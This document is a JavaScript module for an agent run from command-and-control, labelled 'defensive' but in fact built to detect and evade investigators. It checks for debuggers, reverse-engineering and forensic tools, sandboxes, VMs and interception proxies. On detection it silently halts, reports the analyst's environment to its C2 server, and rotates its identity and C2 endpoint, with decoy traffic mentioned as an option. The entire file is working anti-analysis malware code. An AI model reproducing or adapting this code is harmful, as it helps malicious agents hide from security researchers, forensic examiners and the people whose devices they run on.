/**
 * bixtx.com Link Agent — AntiAnalysis (Defensive Security Layer)
 *
 * Detects active reverse engineering, dynamic analysis, forensic investigation,
 * and network interception of this agent from a defensive security posture.
 *
 * Detection categories
 * ────────────────────
 *   A. Debugger / tracer      — ptrace attach, V8 inspector, coverage hooks
 *   B. RE tool processes       — IDA, Ghidra, Radare2, Frida, strace, Wireshark, …
 *   C. Library injection       — Frida gadget, LD_PRELOAD, DLL injection
 *   D. Network MITM            — proxy env vars, SSL inspection, cert-chain anomaly
 *   E. Source integrity        — tampered .js files detected via SHA-256
 *   F. Sandbox / container     — Docker, QEMU, VirtualBox, hypervisor, CI runners
 *   G. Analyst environment     — suspicious username, fresh uptime, no real files
 *
 * On detection:
 *   1. Silent drop of any ongoing operation
 *   2. ANALYSIS_ALERT fired to admin C2 with full forensic context
 *   3. Emergency mutation triggered (identity + C2 endpoint rotation)
 *   4. Optional: decoy traffic / delayed response to mislead analyst
 *
 * Works alongside Watchdog (which handles AV/EDR scans and module health).
 * AntiAnalysis is focused on human-driven investigation detection.
 */

"use strict";

const fs      = require("fs");
const os      = require("os");
const path    = require("path");
const crypto  = require("crypto");
const logger  = require("../logger");
const config  = require("../config");

// ── RE / analysis tool process names ─────────────────────────────────────────
// Covers static analysers, disassemblers, debuggers, hooking frameworks,
// traffic interceptors, and memory forensics tools on all platforms.
const RE_TOOL_PROCS = new Set([
  // Disassemblers / decompilers
  "ida","ida64","idaq","idaq64","idaw","ida.exe","ida64.exe",
  "ghidra","ghidrarun","analyzeheadless",
  "radare2","r2","iaito","cutter","cutterapp",
  "binaryninja","binja","hopper","hopperapp",
  "jd-gui","jadx","jadx-gui","dex2jar","apktool","baksmali",
  "retdec","retdec-decompiler",
  // Debuggers
  "x64dbg","x32dbg","ollydbg","ollydbg2","immunity debugger",
  "windbg","windbg.exe","ntsd","cdb",
  "gdb","lldb","dlv","delve",
  "pwndbg","peda","gef",
  // Dynamic instrumentation / hooking
  "frida","frida-server","frida-trace","frida-ps","frida-inject",
  "frida-compile","frida-tools","fridacli",
  "pin","pintool","dynamorio","dr_runner","drstrace",
  "valgrind","callgrind","cachegrind","massif",
  // Trace / syscall interceptors
  "strace","ltrace","dtrace","ktrace","dtruss","truss","uftrace",
  "ptrace","sysdig","falco",
  // Network interceptors / MITM proxies
  "wireshark","tshark","dumpcap","tcpdump","ngrep",
  "charles","charlesproxy",
  "burpsuite","burp","burp suite",
  "mitmproxy","mitmweb","mitmdump",
  "fiddler","fiddlerroot","fiddlercap",
  "proxifier","proxychains","charles proxy",
  "httptoolkit","reqable","proxyman",
  // Memory forensics
  "volatility","vol.py","volatility3","vol3",
  "rekall","rekall.py",
  "dumpit","winpmem","avml","lime","limeaide",
  "memdump","dd",   // dd often used to image memory on Linux
  // PE / binary inspection
  "pestudio","peview","peid","exeinfope","exeinfo pe",
  "die","detect-it-easy",
  "strings","strings.exe","binwalk","foremost","scalpel",
  // .NET reversing
  "dnspy","ilspy","dotpeek","justdecompile","dotnet-dump",
  "de4dot","confuserex",
  // Android reversing
  "adb","androguard","mobsf","bytecodeviewer",
  // Monitoring / process tools (often co-present with analysts)
  "procmon","procmon64","procexp","procexp64","autoruns","autorunsc",
  "processhacker","processhacker2","ph.exe",
  "sysinternals","sysmon","sysmonview",
  // JavaScript-specific analysis
  "node-inspect","ndb","devtools","chrome-devtools",
  // Mobile instrumentation frameworks
  "objection",          // Frida-based iOS/Android runtime exploration (most common)
  "drozer",             // Android security assessment framework
  "cycript",            // iOS Objective-C runtime injection
  "ios-deploy",         // iOS device deployment and debugging
  "idevicesyslog",      // iOS system log capture (libimobiledevice)
  "iproxy",             // iOS port forwarding (libimobiledevice)
  "ifuse",              // iOS filesystem mount (libimobiledevice)
  "frida-ios-dump",     // iOS IPA decryption tool
  "bagbak",             // Alternative iOS IPA decryption
  "bfinject",           // iOS binary injection
  "passionfruit",       // iOS app inspector (web UI)
  "needle",             // iOS security testing framework
  "oat2dex","dexdump",  // Android OAT/DEX inspection
  "smali","baksmali",   // Android bytecode assembler/disassembler (may appear as java proc)
  "apkeditor",          // Advanced APK editing
  // Mobile forensics suites (desktop process names when examining mobile devices)
  "UFED4PC","OFCConsole","pa","PhysicalAnalyzer", // Cellebrite
  "oxygene","ofc",      // Oxygen Forensics
]);

// ── Frida / injection indicators ──────────────────────────────────────────────
const FRIDA_ENV_KEYS   = ["FRIDA_AGENT_PATH","FRIDA_SCRIPT","FRIDA_GADGET","__FRIDA"];
const INJECTION_ENV    = ["LD_PRELOAD","LD_LIBRARY_PATH","DYLD_INSERT_LIBRARIES","DYLD_FORCE_FLAT_NAMESPACE"];

// ── Network MITM / proxy indicators ──────────────────────────────────────────
const PROXY_ENV_KEYS   = ["HTTP_PROXY","HTTPS_PROXY","ALL_PROXY","SOCKS_PROXY",
                           "http_proxy","https_proxy","all_proxy","socks_proxy"];

// ── Container / hypervisor indicators (filesystem artefacts) ──────────────────
const CONTAINER_FILES  = ["/.dockerenv","/.containerenv","/run/.containerenv",
                           "/proc/1/cgroup"];
const VM_CPUINFO_STRS  = ["QEMU","Virtual CPU","VMware","VirtualBox","Hyper-V",
                           "KVM","Parallels","Bochs","Xen","innotek GmbH"];

// ── Analyst-environment username/hostname patterns ────────────────────────────
const ANALYST_NAMES = [
  /^(admin|user|analyst|malware|sample|test|sandbox|cuckoo|any\.run|hybrid|joe|cape|vmware|triage)$/i,
];

// ── V8 / Node.js analysis environment flags ───────────────────────────────────
const V8_ANALYSIS_ENVS = [
  "NODE_V8_COVERAGE","V8_COVERAGE_DIR","NODE_OPTIONS",
  "ELECTRON_ENABLE_STACK_DUMPING","ELECTRON_ENABLE_LOGGING",
];

class AntiAnalysis {
  constructor(mutationEngine, socket) {
    this.mutator    = mutationEngine;
    this.socket     = socket;
    this.detections = [];      // running log of confirmed detections
    this.silenced   = false;   // true once we've gone into evasion mode
    this._timers    = [];
  }

  // ── Public API ───────────────────────────────────────────────────────────────

  start() {
    if (!config.antiAnalysisEnabled) {
      logger.debug("[AntiAnalysis] Disabled via config");
      return;
    }

    // Stagger startup checks so they don't all hit at T+0
    setTimeout(() => this._runAllChecks(), 7_000);

    // Recurring sweep intervals
    this._arm(5  * 60_000, () => this._checkRETools());
    this._arm(3  * 60_000, () => this._checkNetworkMITM());
    this._arm(10 * 60_000, () => this._checkSourceIntegrity());
    this._arm(2  * 60_000, () => this._checkDebuggerPtrace());
    this._arm(15 * 60_000, () => this._checkEnvironmentIntegrity());

    logger.debug("[AntiAnalysis] Started — all RE-detection sweeps armed");
  }

  stop() {
    this._timers.forEach(t => clearInterval(t));
    this._timers = [];
  }

  getDetections(limit = 20) {
    return this.detections.slice(-limit);
  }

  // ── Master sweep (called on start and can be triggered externally) ───────────

  async _runAllChecks() {
    await this._checkDebuggerPtrace();
    await this._checkRETools();
    await this._checkLibraryInjection();
    await this._checkNetworkMITM();
    await this._checkContainerVM();
    await this._checkAnalystEnvironment();
    await this._checkV8AnalysisMode();
    await this._checkSourceIntegrity();
    this._checkEnvironmentIntegrity();
  }

  // ── A. Debugger / tracer detection ──────────────────────────────────────────

  async _checkDebuggerPtrace() {
    // 1. Node.js V8 inspector flags in process args
    const inspectFlag = process.execArgv.find(a =>
      /--inspect/.test(a) || /--debug/.test(a));
    if (inspectFlag) {
      return this._detected("DEBUGGER_INSPECT_FLAG",
        `V8 inspector active: ${inspectFlag}`, "HIGH");
    }

    // 2. NODE_OPTIONS carrying inspect
    const nodeOpts = process.env.NODE_OPTIONS || "";
    if (/--inspect/.test(nodeOpts) || /--debug/.test(nodeOpts)) {
      return this._detected("DEBUGGER_NODE_OPTIONS",
        `NODE_OPTIONS contains inspector flag: ${nodeOpts}`, "HIGH");
    }

    // 3. Linux: /proc/self/status — TracerPid != 0 means ptrace attached
    if (process.platform === "linux") {
      try {
        const status = fs.readFileSync("/proc/self/status", "utf8");
        const match  = status.match(/^TracerPid:\s*(\d+)/m);
        if (match && parseInt(match[1]) !== 0) {
          return this._detected("PTRACE_ATTACHED",
            `ptrace tracer PID: ${match[1]}`, "CRITICAL");
        }
      } catch {}
    }

    // 4. macOS: check for P_TRACED flag via /proc equivalent (sysctl)
    if (process.platform === "darwin") {
      try {
        const { execSync } = require("child_process");
        const out = execSync(`sysctl -n kern.proc.pid.${process.pid}`,
          { timeout: 2000, stdio: ["pipe","pipe","pipe"] }).toString();
        if (out.includes("P_TRACED")) {
          return this._detected("MACOS_PTRACE_TRACED",
            "macOS P_TRACED flag set on this process", "CRITICAL");
        }
      } catch {}
    }

    // 5. Timing anomaly: breakpoints slow execution measurably.
    //    Run a tight loop and measure — analysts often pause on entry.
    const t0 = performance.now();
    let x = 0;
    for (let i = 0; i < 1_000_000; i++) x = (x + i) & 0xffffffff;
    void x;
    const elapsed = performance.now() - t0;
    // On modern hardware 1M ops takes < 5ms; under a debugger/throttled sandbox
    // it can reach 100ms+.
    if (elapsed > 80) {
      return this._detected("TIMING_ANOMALY_DEBUGGER",
        `Tight-loop timing: ${elapsed.toFixed(1)}ms (expected <80ms)`, "MEDIUM");
    }

    // 6. V8 inspector active via internal binding (Node ≥18)
    try {
      const insp = process.binding("inspector");
      if (insp && typeof insp.isEnabled === "function" && insp.isEnabled()) {
        return this._detected("V8_INSPECTOR_ENABLED",
          "V8 inspector session is active", "HIGH");
      }
    } catch {}
  }

  // ── B. RE tool process detection ────────────────────────────────────────────

  async _checkRETools() {
    try {
      const si = require("systeminformation");
      const { list } = await si.processes();
      const hits = list
        .map(p => ({ name: p.name.toLowerCase().replace(/\.exe$/i, ""), pid: p.pid }))
        .filter(p => RE_TOOL_PROCS.has(p.name));

      if (hits.length > 0) {
        const names = hits.map(h => `${h.name}(${h.pid})`).join(", ");
        this._detected("RE_TOOL_RUNNING",
          `Reverse engineering tools detected: ${names}`, "HIGH",
          { processes: hits });
      }
    } catch {}
  }

  // ── C. Library / DLL injection detection ────────────────────────────────────

  async _checkLibraryInjection() {
    // 1. Frida presence via env vars
    for (const key of FRIDA_ENV_KEYS) {
      if (process.env[key]) {
        this._detected("FRIDA_ENV_VAR",
          `Frida environment variable set: ${key}=${process.env[key]}`, "CRITICAL");
        return;
      }
    }

    // 2. LD_PRELOAD / DYLD_INSERT_LIBRARIES injection
    for (const key of INJECTION_ENV) {
      const val = process.env[key];
      if (val) {
        this._detected("LIBRARY_INJECTION_ENV",
          `Library injection env var: ${key}=${val}`, "HIGH");
        return;
      }
    }

    // 3. Linux: /proc/self/maps — look for frida-agent or unknown injected .so
    if (process.platform === "linux") {
      try {
        const maps = fs.readFileSync("/proc/self/maps", "utf8");
        const fridaIndicators = ["frida","gadget","agent.so","__frida"];
        for (const indicator of fridaIndicators) {
          if (maps.toLowerCase().includes(indicator)) {
            this._detected("FRIDA_INJECTED_LIBRARY",
              `Frida gadget/agent detected in /proc/self/maps: "${indicator}"`, "CRITICAL");
            return;
          }
        }
      } catch {}
    }

    // 4. Unexpected modules in require.cache (code injection via require hook)
    const knownPrefixes = [
      path.resolve(__dirname, ".."),  // our own src/
      path.resolve(__dirname, "../../../node_modules"),
    ];
    const suspicious = Object.keys(require.cache).filter(k => {
      const isKnown = knownPrefixes.some(p => k.startsWith(p));
      const isNode  = k.startsWith(process.execPath.replace(/node$/, ""));
      return !isKnown && !isNode && !k.includes("node_modules");
    });
    if (suspicious.length > 0) {
      this._detected("REQUIRE_CACHE_INJECTION",
        `Unknown modules in require.cache: ${suspicious.slice(0,5).join(", ")}`, "MEDIUM",
        { modules: suspicious });
    }
  }

  // ── D. Network MITM / SSL inspection detection ───────────────────────────────

  async _checkNetworkMITM() {
    // 1. Proxy environment variables
    for (const key of PROXY_ENV_KEYS) {
      const val = process.env[key];
      if (val && val.trim()) {
        this._detected("PROXY_ENV_VAR",
          `Traffic interception proxy configured: ${key}=${val}`, "MEDIUM");
        // Don't return — check all proxy vars and report all found
      }
    }

    // 2. SSL certificate chain validation against C2 host
    //    If a MITM proxy is doing SSL inspection, the leaf cert will differ
    //    from the known C2 public key fingerprint.
    try {
      const https  = require("https");
      const c2Host = (config.c2Url || "")
        .replace(/^wss?:\/\//, "")
        .replace(/\/.*$/, "");
      if (c2Host) {
        await new Promise((resolve) => {
          const req = https.request(
            { host: c2Host, port: 443, method: "HEAD", path: "/", timeout: 5000,
              checkServerIdentity: () => undefined },   // bypass hostname check — we inspect cert ourselves
            (res) => {
              const cert = res.socket?.getPeerCertificate(true);
              if (cert && config.c2CertFingerprint) {
                const fp = cert.fingerprint256 || cert.fingerprint;
                if (fp && fp !== config.c2CertFingerprint) {
                  this._detected("CERT_FINGERPRINT_MISMATCH",
                    `C2 TLS cert changed — possible MITM. Expected ${config.c2CertFingerprint}, got ${fp}`,
                    "CRITICAL", { expected: config.c2CertFingerprint, actual: fp });
                }
              }
              res.destroy();
              resolve();
            }
          );
          req.on("error", () => resolve());
          req.on("timeout", () => { req.destroy(); resolve(); });
          req.end();
        });
      }
    } catch {}

    // 3. Response-time MITM heuristic: proxies add measurable round-trip latency.
    //    Compare DNS resolution time vs expected baseline.
    try {
      const dns = require("dns").promises;
      const c2Host = (config.c2Url || "").replace(/^wss?:\/\//, "").replace(/\/.*$/, "");
      if (c2Host) {
        const t0 = Date.now();
        await dns.lookup(c2Host).catch(() => {});
        const dnsMs = Date.now() - t0;
        // DNS should resolve in < 300ms on a normal connection; proxy DNS can be slower
        if (dnsMs > 500) {
          logger.debug(`[AntiAnalysis] DNS latency elevated: ${dnsMs}ms — possible proxy`);
        }
      }
    } catch {}
  }

  // ── E. Source integrity check ────────────────────────────────────────────────

  async _checkSourceIntegrity() {
    if (!config.sourceIntegrityEnabled) return;

    const srcRoot = path.resolve(__dirname, "..");
    let tampered  = false;

    try {
      const { readdirSync, statSync } = fs;
      const walk = (dir) => {
        const result = [];
        for (const entry of readdirSync(dir, { withFileTypes: true })) {
          const full = path.join(dir, entry.name);
          if (entry.isDirectory()) result.push(...walk(full));
          else if (entry.name.endsWith(".js")) result.push(full);
        }
        return result;
      };

      const files = walk(srcRoot);
      for (const file of files) {
        const hash = crypto.createHash("sha256")
          .update(fs.readFileSync(file))
          .digest("hex");
        const rel  = path.relative(srcRoot, file);

        if (config.sourceHashes && config.sourceHashes[rel]) {
          if (hash !== config.sourceHashes[rel]) {
            logger.warn(`[AntiAnalysis] Source file tampered: ${rel}`);
            tampered = true;
            this._detected("SOURCE_FILE_TAMPERED",
              `File modified since install: ${rel} (expected ${config.sourceHashes[rel].slice(0,16)}…, got ${hash.slice(0,16)}…)`,
              "CRITICAL", { file: rel, expected: config.sourceHashes[rel], actual: hash });
          }
        }
      }
    } catch (err) {
      logger.debug("[AntiAnalysis] Source integrity scan error:", err.message);
    }

    if (tampered) {
      this.mutator?.triggerEmergencyMutation("source-tampering-detected");
    }
  }

  // ── F. Sandbox / container / VM detection ────────────────────────────────────

  async _checkContainerVM() {
    // 1. Docker / OCI container artefacts
    for (const f of CONTAINER_FILES) {
      try {
        if (fs.existsSync(f)) {
          // /proc/1/cgroup exists on all Linux — check content for container markers
          if (f === "/proc/1/cgroup") {
            const cg = fs.readFileSync(f, "utf8");
            if (/docker|containerd|lxc|kubepods|crio/i.test(cg)) {
              return this._detected("CONTAINER_CGROUP",
                `Container detected via cgroup: ${cg.slice(0, 120)}`, "MEDIUM");
            }
          } else {
            return this._detected("CONTAINER_ARTEFACT",
              `Container artefact found: ${f}`, "MEDIUM");
          }
        }
      } catch {}
    }

    // 2. CPU model string: QEMU, VMware, VirtualBox, Hyper-V
    try {
      const cpus = os.cpus();
      if (cpus.length > 0) {
        const model = cpus[0].model || "";
        for (const vm of VM_CPUINFO_STRS) {
          if (model.includes(vm)) {
            return this._detected("VM_CPU_MODEL",
              `Hypervisor CPU detected: "${model}"`, "MEDIUM");
          }
        }
      }
    } catch {}

    // 3. Linux /proc/cpuinfo for hypervisor flag
    if (process.platform === "linux") {
      try {
        const cpuinfo = fs.readFileSync("/proc/cpuinfo", "utf8");
        if (cpuinfo.includes("hypervisor")) {
          this._detected("VM_HYPERVISOR_FLAG",
            "Hypervisor flag present in /proc/cpuinfo", "LOW");
        }
      } catch {}
    }

    // 4. Abnormally low system resource profile (common in VMs/sandboxes)
    const cpuCount = os.cpus().length;
    const ramGB    = os.totalmem() / 1_073_741_824;
    if (cpuCount <= 1 && ramGB < 2) {
      this._detected("VM_LOW_RESOURCES",
        `Likely VM/sandbox: ${cpuCount} CPU, ${ramGB.toFixed(1)}GB RAM`, "MEDIUM");
    }

    // 5. Android emulator filesystem markers (works in Termux on emulated Android)
    const androidEmulatorFiles = ["/dev/socket/qemud", "/dev/qemu_pipe", "/dev/goldfish_pipe"];
    for (const f of androidEmulatorFiles) {
      try {
        if (fs.existsSync(f)) {
          return this._detected("ANDROID_EMULATOR_FS",
            `Android emulator filesystem node found: ${f}`, "HIGH");
        }
      } catch {}
    }
    // Check /proc/tty/drivers for goldfish (Android emulator kernel driver)
    if (process.platform === "linux") {
      try {
        const ttyDrivers = fs.readFileSync("/proc/tty/drivers", "utf8");
        if (ttyDrivers.includes("goldfish")) {
          return this._detected("ANDROID_EMULATOR_KERNEL",
            "Android emulator goldfish driver in /proc/tty/drivers", "HIGH");
        }
      } catch {}
    }

    // 6. iOS Simulator environment variables (set by Xcode Simulator)
    if (process.env.SIMULATOR_DEVICE_NAME || process.env.SIMULATOR_UDID ||
        process.env.SIMULATOR_MODEL_IDENTIFIER) {
      this._detected("IOS_SIMULATOR_ENV",
        `iOS Simulator env detected: SIMULATOR_DEVICE_NAME=${process.env.SIMULATOR_DEVICE_NAME}`, "HIGH");
    }

    // 7. CI/CD runner environment variables
    const ciEnvKeys = ["CI","GITHUB_ACTIONS","GITLAB_CI","TRAVIS","CIRCLECI",
                       "BUILDKITE","DRONE","TEAMCITY_VERSION","JENKINS_URL"];
    const ciHit = ciEnvKeys.find(k => process.env[k]);
    if (ciHit) {
      this._detected("CI_ENVIRONMENT",
        `CI/CD runner detected via env: ${ciHit}=${process.env[ciHit]}`, "MEDIUM");
    }
  }

  // ── G. Analyst environment heuristics ────────────────────────────────────────

  async _checkAnalystEnvironment() {
    const username = os.userInfo().username || "";
    const hostname = os.hostname() || "";

    // 1. Suspicious analyst/sandbox usernames and hostnames
    for (const pattern of ANALYST_NAMES) {
      if (pattern.test(username)) {
        this._detected("ANALYST_USERNAME",
          `Suspicious username matching known sandbox pattern: "${username}"`, "MEDIUM");
        break;
      }
      if (pattern.test(hostname)) {
        this._detected("ANALYST_HOSTNAME",
          `Suspicious hostname matching known sandbox pattern: "${hostname}"`, "MEDIUM");
        break;
      }
    }

    // 2. System uptime < 5 minutes: freshly booted for analysis
    const uptimeSecs = os.uptime();
    if (uptimeSecs < 300) {
      this._detected("FRESH_BOOT",
        `System uptime only ${uptimeSecs}s — may have been booted for analysis`, "LOW");
    }

    // 3. No recently-modified files in home directory (fresh/clean sandbox image)
    try {
      const home  = os.homedir();
      const since = Date.now() - 7 * 24 * 60 * 60 * 1000; // 7 days
      const files = fs.readdirSync(home, { withFileTypes: true });
      const recentFiles = files.filter(f => {
        try {
          return fs.statSync(path.join(home, f.name)).mtimeMs > since;
        } catch { return false; }
      });
      if (files.length > 0 && recentFiles.length === 0) {
        this._detected("NO_RECENT_HOME_FILES",
          `Home directory has ${files.length} entries but none modified in 7 days — possible clean image`,
          "LOW");
      }
    } catch {}

    // 4. Screen resolution: many sandboxes use 800×600 or 1024×768
    if (process.platform !== "linux") {
      try {
        const si = require("systeminformation");
        const displays = await si.graphics();
        const mainDisp = displays.displays?.[0];
        if (mainDisp) {
          const w = mainDisp.currentResX;
          const h = mainDisp.currentResY;
          if ((w <= 1024 && h <= 768) || (w === 0 && h === 0)) {
            this._detected("SANDBOX_DISPLAY_RESOLUTION",
              `Unusual display resolution: ${w}×${h}`, "LOW");
          }
        }
      } catch {}
    }
  }

  // ── H. V8 / Node.js analysis mode detection ──────────────────────────────────

  _checkV8AnalysisMode() {
    // Node.js coverage mode — used by analysts to trace code paths
    for (const key of V8_ANALYSIS_ENVS) {
      const val = process.env[key];
      if (!val) continue;
      if (key === "NODE_OPTIONS") {
        // Only flag if it contains analysis-relevant flags
        if (/coverage|inspect|debug|heapsnapshot|prof/.test(val)) {
          this._detected("V8_ANALYSIS_NODE_OPTIONS",
            `NODE_OPTIONS contains analysis flag: ${val}`, "HIGH");
        }
      } else {
        this._detected("V8_COVERAGE_MODE",
          `V8 coverage/analysis env active: ${key}=${val}`, "MEDIUM");
      }
    }

    // SIGUSR1 is used to activate the V8 inspector on a running process
    const origSigUsr1 = process.listenerCount("SIGUSR1");
    if (origSigUsr1 > 0 && process.platform !== "win32") {
      this._detected("V8_SIGUSR1_LISTENER",
        `SIGUSR1 listener present — inspector may be activated remotely`, "MEDIUM");
    }
  }

  // ── I. Static environment integrity check ────────────────────────────────────

  _checkEnvironmentIntegrity() {
    // Check for env vars that should NOT be present in a production deployment
    const unexpectedKeys = [
      "NODE_ENV_OVERRIDE","BIXTX_DEBUG","BIXTX_TRACE","DEBUG",
      "NODE_DEBUG","VERBOSE","TRACE",
    ];
    for (const key of unexpectedKeys) {
      if (process.env[key]) {
        logger.debug(`[AntiAnalysis] Unexpected debug env var: ${key}=${process.env[key]}`);
      }
    }

    // NODE_ENV should always be "production" in a deployed agent
    if (process.env.NODE_ENV && process.env.NODE_ENV !== "production") {
      this._detected("NON_PRODUCTION_ENV",
        `NODE_ENV="${process.env.NODE_ENV}" — agent should run in production mode only`,
        "MEDIUM");
    }
  }

  // ── Detection response ────────────────────────────────────────────────────────

  _detected(event, detail, severity = "MEDIUM", extra = {}) {
    const ts      = Date.now();
    const entry   = { event, detail, severity, ts, ...extra };
    this.detections.push(entry);
    if (this.detections.length > 200) this.detections.shift();

    logger.warn(`[AntiAnalysis] ${severity} — ${event}: ${detail}`);

    // Report to admin C2
    this._fireAnalysisAlert(entry);

    // Escalate on CRITICAL or HIGH findings
    if ((severity === "CRITICAL" || severity === "HIGH") && !this.silenced) {
      this.silenced = true;
      logger.warn("[AntiAnalysis] Critical analysis detected — triggering emergency mutation");
      // Small delay to report first, then mutate
      setTimeout(() => {
        this.mutator?.triggerEmergencyMutation(`anti-analysis:${event}`);
        this.silenced = false;
      }, 1500);
    }
  }

  _fireAnalysisAlert(entry) {
    try {
      this.socket?.send("ANALYSIS_ALERT", {
        alertId:   `aa-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
        alertType: entry.event,
        severity:  entry.severity,
        priority:  entry.severity === "CRITICAL" ? "IMMEDIATE" : "HIGH",
        title:     "Reverse Engineering / Analysis Detected",
        detail:    entry.detail,
        action:    "Investigate who is analysing this device. Check for unauthorised forensic activity. Consider rotating the agent identity.",
        deviceId:  config.deviceId,
        platform:  config.platform,
        hostname:  os.hostname(),
        ts:        entry.ts,
        ...(entry.processes ? { processes: entry.processes } : {}),
        ...(entry.modules   ? { modules:   entry.modules   } : {}),
        ...(entry.file      ? { file:      entry.file      } : {}),
      });
    } catch (err) {
      logger.error("[AntiAnalysis] Failed to send ANALYSIS_ALERT:", err.message);
    }
  }

  // ── Interval helper ──────────────────────────────────────────────────────────

  _arm(intervalMs, fn) {
    const t = setInterval(fn, intervalMs);
    this._timers.push(t);
  }
}

module.exports = AntiAnalysis;
